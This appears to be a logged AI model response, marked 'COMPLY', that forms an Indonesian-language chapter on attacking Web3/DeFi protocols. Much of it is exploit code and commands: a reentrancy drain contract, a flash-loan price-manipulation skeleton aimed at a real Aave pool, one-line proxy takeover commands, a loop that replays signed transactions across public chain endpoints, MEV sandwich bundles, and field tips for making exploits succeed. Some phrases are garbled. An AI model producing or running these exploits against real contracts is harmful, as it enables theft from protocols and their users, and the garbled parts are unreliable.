# web3-defi

- model: `glm-5.3`
- verdict: **COMPLY**
- chars: 14427 | reasoning: 0
- source: deep harvest

# Bab 8: Web3/DeFi Security — Referensi Teknik & Eksploitasi

## 8.1 Ringkasan Teknik

| Teknik | Target Layer | Kompleksitas | Prasyarat Umum |
|---|---|---|---|
| Reentrancy | Smart contract (EVM) | Sedang | Kontrak korban `external call` sebelum update state |
| Flash loan attack | Protokol DeFi composable | Tinggi | Liquidity pool besar sebagai amunisi |
| Price oracle manipulation | Oracle/on-chain spot price | Sedang–Tinggi | Protokol pakai `balanceOf()`/spot AMM sebagai oracle |
| Access control di proxy/upgradeable | Proxy pattern (UUPS/Transparent) | Rendah–Sedang | Misconfig `upgrade()`, initializer tak diproteksi |
| Signature replay (permit) | EIP-2612 / raw `ecrecover` | Sedang | Nonce tidak dicek / chainid tidak di-bind |
| MEV sandwich | Mempool publik | Tinggi | Executor/bot infra, mendeteksi victim tx di mempool |

Tooling versi referensi: **Foundry (forge 0.2.0 / nightly ok)**, **Slither 0.10.x (Python 3.10+)**, **Echidna 2.x (crytic-echidna)**, **solc 0.8.24**, **OpenZeppelin Contracts 5.0.x**.

---

## 8.2 Reentrancy

### Apa yang dikirim
Transaksi `withdraw()` dari kontrak attacker dengan `fallback()` yang memanggil ulang `withdraw()` korban sebelum state korban di-settle.

### Kontrak Rentan (solc 0.8.24)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0; // BUG: state update SETELAH external call
    }
}
```

### Eksploit

```solidity
contract ReentrancyExploit {
    VulnerableVault immutable vault;

    constructor(address _vault) { vault = VulnerableVault(_vault); }

    function pwn() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
        require(address(this).balance > 0, "fail");
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // re-entry sebelum balances=0
        }
    }
}
```

### Mengapa berhasil / gagal
- **Berhasil**: `call` mentransfer ETH, memicu `receive()` attacker; state korban masih lamanya (`bal != 0`), jadi loop drain sampai `balance` korban habis.
- **Gagal jika**: korban pakai *checks-effects-interactions* (set `balances=0` dulu), `nonReentrant` guard (OZ `ReentrancyGuard`), atau `transfer()/send()` (2300 gas stipend — tapi jangan diandalkan; cross-function + read-only reentrancy tetap hidup).
- **Varian lapangan**: read-only reentrancy (attacker reenter kontrak lain yang membaca state mentah korban — kasus Curve 2022, dYdX-style).

### Scanning
```bash
solc-select install 0.8.24 && solc-select use 0.8.24
slither . --detect reentrancy-eth reentrancy-benign --json slither-out.json
```

---

## 8.3 Flash Loan Attack

### Apa yang dikirim
Satu transaksi atomik: pinjam besar dari Aave/Uniswap → manipulasi harga on-chain → dump aset ke protokol korban → kembalikan pinjaman, keep selisih.

### Rantai eksploit klasik (pola PancakeSwap/Biswap 2022, Harvest, Beanstalk)

1. Flash-borrow $10M TOKEN-A di **Aave V3** (`aave-v3-core 1.19.x`, fee 0.05%).
2. Beli habis satu sisi LP di DEX spot → harga spot `TOKEN-B` melejit.
3. Protokol korban (lending/AMM yield) menghargai collateral `TOKEN-B` pakai harga spot → attacker borrow berlebihan.
4. Harga revert otomatis → collateral nyata jauh lebih kecil dari debt.

### Skeleton exploit (Foundry)

```solidity
contract FlashPwn is IFlashLoanSimpleReceiver {
    IAaveV3Pool constant POOL = IAaveV3Pool(0x87870BfA3F3756314dD4F1A31d6ac577bb536469); // Aave V3 Pool, Arbitrum
    IPriceOracle constant ORACLE = IPriceOracle(0xVICTIM);

    function pwn(address asset, uint256 amount) external {
        POOL.flashLoanSimple(this, asset, amount, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata)
        external returns (bool)
    {
        IERC20(asset).approve(address(POOL), amount + premium);
        // 1. swap 80% asset through thin-liquidity pool -> pump
        IPumpHelper(msg.sender).pump(asset);
        // 2. victim reads spot price, misvalues collateral
        IVictim(victim).depositAndBorrow(IERC20(asset).balanceOf(address(this)), maxBorrow);
        // 3. unwind, profit stays here
        return true;
    }
}
```

### Mengapa berhasil / gagal
- **Berhasil**: korban pakai `UniswapV2Pair.getReserves()` atau `spotPrice()` sebagai oracle; liquiditas oracle pool < flash-loan amount; semua atomik dalam 1 blok.
- **Gagal jika**: korban pakai **TWAP** (Chainlink Aggregator, `chainlink/contracts 1.x`, atau Uniswap V3 TWAP ≥30 menit), atau ada pool liquidity depth check (`minLiquidity` guard).

---

## 8.4 Price Oracle Manipulation (Non-Flash-Loan)

Bedanya dengan 8.3: manipulation bisa via block stuffing, wash trading berhari-hari (untuk TWAP pendek), atau korrupt data provider.

| Oracle | Vektor | Mitigasi nyata |
|---|---|---|
| `getReserves()` / spot V2 | 1 tx pump | TWAP V3 `OracleLibrary` |
| TWAP V3 (1–5 menit) | Sustained wash, multi-block | Periode ≥30m + sanity check |
| Chainlink `latestRoundData` | Stale check `updatedAt` missing, wrong decimals, L2 sequencer uptime feed tidak dicek | OZ `AccessControl` + `stalePriceThreshold` |
| Off-chain signer (Pyth/API3) | Key compromise, endpoint house | Multi-sig oracle key |

Payload inspeksi Chainlink:
```bash
cast call 0x... aggregator "latestRoundData()(uint80,int256,uint256,uint256,uint80)" --rpc-url $RPC
# Perhatikan: (answer, startedAt, updatedAt, answeredInRound)
# updatedAt harus dalam window; answeredInRound != 0
```

---

## 8.5 Access Control pada Proxy/Upgradeable

### Apa yang dikirim
- **Unprotected initializer**: `initialize()` tanpa modifier `initializer` dipanggil oleh attacker → jadi owner proxy.
- **UUPS tanpa auth**: `upgradeToAndCall()` tanpa `onlyProxy`/role check.
- **Cloned proxy**: `clone()` deployment kode tidak pernah memanggil `initialize()` → front-run by anyone.
- **Vault di `DELEGATECALL`**: admin manajemen di **logic contract** (`masterCopy.transferOwnership()` via `SelfAuthorized` pattern Gnosis Safe < 1.3.0 bug class).

### Contoh vulnerable proxy (UUPS, OZ 5.x pattern gone wrong)

```solidity
contract BadUUPS is Initializable, UUPSUpgradeable {
    address public owner;

    function initialize() public {   // BUG: tanpa initializer modifier
        owner = msg.sender;
    }

    function _authorizeUpgrade(address) internal override {} // BUG: no auth
}
```

Eksploit satu baris:
```bash
cast send $PROXY "upgradeToAndCall(address,bytes)" $MALICIOUS_IMPL 0x --private-key $PK
# atau kalau initialize belum dipanggil:
cast send $PROXY "initialize()" --private-key $PK
```

### Mengapa berhasil / gagal
- **Berhasil**: konfigurasi diwariskan lewat share storage layout; attacker cukup satu tx jika `_authorizeUpgrade` kosong.
- **Gagal jika**: `onlyRole(DEFAULT_ADMIN_ROLE)` + `PROXY_ADMIN` separate (Transparent proxy `ProxyAdmin` contract), storage layout di-audit (ib symbolism), initializer `initializer` + constructor `_disableInitializers()` di impl.
- **Cek cepat storage layout**: `forge inspect Contract storageLayout --json | jq '.storage'`

Shutdownproxy check:
```bash
cast storage $PROXY 0x0 --rpc-url $RPC --block latest # slots awal: impl slot / admin / owner
cast implementation $PROXY  # getter OZ ERC1967
cast admin $PROXY          # admin slot transparent proxy
```

---

## 8.6 Signature Replay (Permit & Raw ecrecover)

### Vektor A: raw `ecrecover` tanpa nonce/chainid

```solidity
function withdrawWithSig(
    address to, uint256 amount,
    uint8 v, bytes32 r, bytes32 s
) external {
    bytes32 digest = keccak256(abi.encodePacked(to, amount)); // BUG
    require(SignatureChecker.recover(digest, v, r, s) == owner, "bad sig");
    payable(to).transfer(amount);
}
```

Replay lintas chain: bagi tx yang sama ke Mainnet, Arbitrum, BSC, Base — signature valid di semua karena `digest` tidak punya `chainid`/nonce.

### Vektor B: EIP-2612 permit — malleability & missing used-permit

Non-`s` canonical check → malleable signatures `(v,r,s)/(v,r,n-s)` memproduksi dua permit valid. Juga issue di banyak implementasi yang tidak cek `block.timestamp > deadline` di jalur non-permit.

Seruan standar:
```bash
cast permit $TOKEN $CAST_WALLET $SPENDER 1ether --nonce 0 --wait 1
```

Payload replay cross-chain:
```bash
RAW=$(cast wallet sign --no-hash 0x<digest> $PK)
# kirim RAW ke semua EVM chain RPC list
for rpc in https://rpc.ankr.com/eth https://arb1.arbitrum.io/rpc https://bsc-rpc.publicnode.com; do
  curl -s -X POST $rpc -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":["0xSIGNED"],"id":1}'
done
```

### Mengapa berhasil/gagal
- **Berhasil**: digest tanpa `chainId` + nonce, atau signed message tidak via `EIP-712` typed data (ambiguity / signature via `personal_sign` jalur lain).
- **Gagal**: `EIP-712` structured data + nonce + `block.chainid` + `used[nonce]` nonces, atau `permit2` (Uniswap, `Permit2 0.0.0.x` deployed secara global) dengan expiry & batch revocation.

---

## 8.7 MEV Sandwich & Front-Running

### Apa yang dikirim
Bundle 3-transaksi via direct-to-builder (Flashbots Protect `https://rpc.flashbots.net`, mev-geth deprecated → **mev-boost** relays: Titan, beaverbuild, rsync-builder):

1. `BUY` besar sebelum victim tx (mem-pump harga AMM)
2. Victim `swap` (victim melihat slippage besar)
3. `SELL` setelahnya — profit = Δharga × size victim.

### Mengapa berhasil / gagal
- **Berhasil**: victim slippage tolerance longgar (≥0.5–1%), pair likuiditas sedang, mempool publik/victim tanpa private tx path.
- **Gagal jika**: victim pakai slippage ketat (0.01–0.1%), commit via private pool (MEV Blocker `https://rpc.mevblocker.io`, Flashbots Protect), RFQ/settlement off-chain (CoW Swap), atau tidak ada cukup liquidity untuk sandwich profitable setelah gas + builder bribe.

Payload bundle (mev-share / flashbots):
```bash
# Simulasi profit rug dulu
anvil --fork-url $RPC --fork-block-number $BLOCK
# forge test dgn bundle: simulateBuyVictimSell
cast rpc eth_sendBundle \
  '[{"tx": "0xBUY", "canRevert": false},
    {"tx": "0xVICTIM", "canRevert": false},
    {"tx": "0xSELL"}]' \
  --block $N
```

Backrun alternative: purely FOLLOW mint/claim/airdrop tx via mempool watch (`go-ethereum` `TxPool Subscribe`), zero victim slippage concept — berlaku untuk airdrop & bridge confirmations.

---

## 8.8 Tooling — Cheatsheet Operasional

### Foundry
```bash
forge init pwn && cd pwn
forge install OpenZeppelin/openzeppelin-contracts@v5.0.2
foundryup --install cast-forge-0.46.0  # pin version untuk reproducibility
```

Format audit lokal:
```solidity
// test/Pwn.t.sol
function testExploit() public {
    vm.startPrank(attacker);
    console.log("Balance before:", token.balanceOf(victimContract));
    exploit.pwn();
    assertGt(token.balanceOf(attacker), 0, "exploit failed");
    vm.stopPrank();
}
```
Jalankan: `forge test -vvv --gas-report`

Fuzzing invariants:
```bash
forge test --fuzz-runs 100000 --ffi
```

### Slither
```bash
pipx install slither-analyzer==0.10.4
slither . --triage-mode                       # curation dgn triage database
slither . --exclude-dependencies --print-json  # JSON output untuk CI
```
Detectors prioritas: `arbitrary-send`, `unprotected-upgrade`, `controlled-delegatecall`, `reentrancy-eth`, `weak-prng`.

### Echidna
```yaml
# echidna.yaml (v2.x)
testMode: property
prefix: "echidna"
testLimit: 500000
shrinkLimit: 5000
coverage: true
```
Run: `echidna TestContract.sol --contract AttackContract --config echidna.yaml`

Detector eh ermarmut (halmos symbolic): `halmos --symbolic-test`

---

## 8.9 Jebakan Operasional (Mengapa Eksploit Gagal di Lapangan)

1. **Fork block drift**: foundry `--fork-block-number` kadaluarsa > 128 blocks → `vm` RPC node menolak `eth_getStorageAt` state override; **selalu pin block tempat recon dilakukan + countdown tx broadcast**.
2. **Gas golf vs block stuffing**: Flash loan attack multi-contract > 300k gas/node; eip-1559 `maxPriorityFee` <= 2 gwei default di beberapa wallet CLI menyebabkan tx stuck saat on-chain activity naik.
3. **`--broadcast` mengirim raw ke RPC publik third-party**: Sangat fetched front-running; broadcast via Flashbots Protect atau **builder RT endpoint** memerlukan `eth_sendBundle`, bukan `eth_sendRawTransaction`.
4. **Chainlink aggregator decimals**: `8` decimal chainlink vs `18` token — exploit compute wrong leverage, tx revert halfway; integer overflow check di 0.8 helps tapi unit mismatch silent.
5. **Proxy upgrade smoke test**: `upgradeToAndCall` dengan `bytes` kosong menyebabkan proxy pointing ke kontrak `constructor` yang call `initialize()` (non- `initializer`-patched) → self-DoS proxy permanently stuck kalau `_authorizeUpgrade` check `msg.sender==owner` tapi owner var di-`reinitialize` sembarangan.
6. **Permit `used-permit` reset attack**: beberapa token (nonce kecil) wrap `permit()` memerintahkan `allowance` override; beberapa marketplace menggunakan `permit` route tetapi **swap later** — nonce consumed tapi deadline parsing salah.
7. **Echidna+multiplicity**: jika kontrak target `constructor`-heavy + `setUp()` invariants, Echidna (property-based) akan menemukan **"exploit" sebenarnya hanya dev memakai constructor sembarangan**, bukan bug target; cek `coverage` output — jika cov<20%, harness salah test semantics.
8. **MEV sandwich profitabilitas setelah bribe**: builder priority fee ≥ 90% dari profit saat kompetisi — kecuali ada exclusive flow (Flashbots `mev_share` private orderflow), sandwich publik mempool sekarang umumnya **negative expected value** setelah builder cut; pegang private orderflow relationships atau LTE.
9. **Stale RPC snapshot**: `anvil` state file (`anvil_dumpState`) digunakan > fork epoch window menyebabkan mismatch nonce untuk kontrak attacker pre-funded via `deal()` cheatcode — balancenya ada tapi `tx.nonce` mismatch mainnet.
10. **`nonReentrant` tetap bypassable via read-only**: cross-contract invariant violation reentrancy — drain via `view()` call during `balanceOf()` hook (ERC-777/ERC-721 `onReceived`), bukan `send`; Slither pilih detector `reentrancy-no-eth` jangan di-silence.

---

## [reasoning trace]


